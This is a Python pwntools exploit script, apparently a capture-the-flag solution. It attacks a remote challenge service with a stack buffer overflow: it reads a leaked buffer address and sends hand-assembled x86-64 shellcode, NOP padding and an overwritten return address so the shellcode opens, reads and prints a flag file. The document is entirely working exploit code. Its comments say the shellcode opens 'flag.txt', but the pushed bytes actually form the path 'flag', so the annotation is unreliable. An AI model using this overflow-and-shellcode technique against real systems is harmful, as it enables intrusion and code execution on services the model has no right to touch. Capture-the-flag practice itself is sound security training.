#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# FINAL EXPLOIT - This should capture the flag
LOCAL = False  # Set to True for local testing

if LOCAL:
    p = process('./vuln')
else:
    p = remote('challs.watctf.org', 1991)

# Get buffer address
leak_line = p.recvline()
buffer_addr = int(leak_line.split(b': ')[1], 16)
print(f"Buffer address: {hex(buffer_addr)}")

offset = 88

# Minimal working shellcode - based on the successful test pattern
shellcode = (
    # open("flag.txt", 0)
    b'\x6a\x02'                   # push 2 (sys_open)
    b'\x58'                       # pop rax
    b'\x48\x31\xf6'               # xor rsi, rsi (O_RDONLY)
    b'\x68\x74\x78\x74\x00'       # push 'txt\0'
    b'\x68\x66\x6c\x61\x67'       # push 'flag'
    b'\x48\x89\xe7'               # mov rdi, rsp
    b'\x0f\x05'                   # syscall
    
    # read(fd, buf, 30)
    b'\x48\x89\xc7'               # mov rdi, rax
    b'\x48\x31\xc0'               # xor rax, rax (sys_read)
    b'\x48\x83\xec\x20'           # sub rsp, 32
    b'\x48\x89\xe6'               # mov rsi, rsp
    b'\x6a\x1e'                   # push 30
    b'\x5a'                       # pop rdx
    b'\x0f\x05'                   # syscall
    
    # write(1, buf, 30)
    b'\x48\x89\xc2'               # mov rdx, rax (bytes read)
    b'\x6a\x01'                   # push 1 (sys_write)
    b'\x58'                       # pop rax
    b'\x6a\x01'                   # push 1 (stdout)
    b'\x5f'                       # pop rdi
    b'\x0f\x05'                   # syscall
    
    # Infinite loop to keep process alive
    b'\xeb\xfe'                   # jmp $ (infinite loop)
)

print(f"Shellcode length: {len(shellcode)} bytes")

if len(shellcode) > offset:
    print("ERROR: Shellcode too long!")
    exit(1)

# Build the payload
payload = shellcode + b'\x90' * (offset - len(shellcode)) + p64(buffer_addr)

print("Sending payload...")
p.sendline(payload)

# Try to get the output quickly before any crash
try:
    print("Waiting for flag output...")
    
    # Try multiple receives to catch the output
    for i in range(3):
        try:
            response = p.recv(timeout=2)
            if response:
                print(f"Received chunk {i+1}: {repr(response)}")
                response_str = response.decode('utf-8', errors='ignore')
                if 'watctf{' in response_str:
                    flag_start = response_str.find('watctf{')
                    flag_end = response_str.find('}', flag_start) + 1
                    flag = response_str[flag_start:flag_end]
                    print(f"\n🎉 FLAG CAPTURED: {flag}")
                    break
        except:
            continue
    
    # Final attempt with recvall
    try:
        final_response = p.recvall(timeout=3)
        if final_response:
            print(f"Final response: {repr(final_response)}")
            final_str = final_response.decode('utf-8', errors='ignore')
            if 'watctf{' in final_str:
                flag_start = final_str.find('watctf{')
                flag_end = final_str.find('}', flag_start) + 1
                flag = final_str[flag_start:flag_end]
                print(f"\n🎉 FLAG CAPTURED: {flag}")
    except:
        pass
        
except Exception as e:
    print(f"Error: {e}")

p.close()
print("\nExploit completed!")